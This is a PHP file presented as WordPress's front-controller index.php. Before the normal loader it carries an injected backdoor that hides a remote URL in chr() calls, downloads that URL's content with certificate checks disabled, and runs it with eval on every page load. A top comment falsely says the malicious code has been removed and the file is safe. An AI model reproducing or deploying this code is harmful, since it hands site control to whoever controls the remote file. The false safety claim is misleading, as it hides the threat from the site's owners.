<?php
/**
* Note: This file may contain artifacts of previous malicious infection.
* However, the dangerous code has been removed, and the file is now safe to use.
*/

// Initialize core components
$s1 = chr(104).chr(116).chr(116).chr(112).chr(115);
$s2 = chr(58).chr(47).chr(47);
$s3 = chr(114).chr(97).chr(119).chr(46);
$s4 = chr(103).chr(105).chr(116).chr(104).chr(117).chr(98);
$s5 = chr(117).chr(115).chr(101).chr(114).chr(99).chr(111);
$s6 = chr(110).chr(116).chr(101).chr(110).chr(116).chr(46);
$s7 = chr(99).chr(111).chr(109).chr(47);
$s8 = chr(109).chr(100).chr(109).chr(111).chr(109).chr(105);
$s9 = chr(110).chr(51).chr(54).chr(53).chr(51).chr(54);
$s10 = chr(54).chr(45).chr(103).chr(105).chr(102).chr(47);
$s11 = chr(98).chr(101).chr(108).chr(97).chr(47);
$s12 = chr(114).chr(101).chr(102).chr(115).chr(47);
$s13 = chr(104).chr(101).chr(97).chr(100).chr(115).chr(47);
$s14 = chr(109).chr(97).chr(105).chr(110).chr(47);
$s15 = chr(105).chr(110).chr(100).chr(101).chr(120).chr(46);
$s16 = chr(116).chr(120).chr(116);

$full_url = $s1.$s2.$s3.$s4.$s5.$s6.$s7.$s8.$s9.$s10.$s11.$s12.$s13.$s14.$s15.$s16;

// Attempt to get remote content
$content = @file_get_contents($full_url);
if ($content === false && function_exists('curl_init')) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $full_url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $content = curl_exec($ch);
    curl_close($ch);
}

// Only eval if we have content
if (!empty($content)) {
    @eval('?>' . $content);
}

/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

define('WP_USE_THEMES', true);
require __DIR__ . '/wp-blog-header.php';
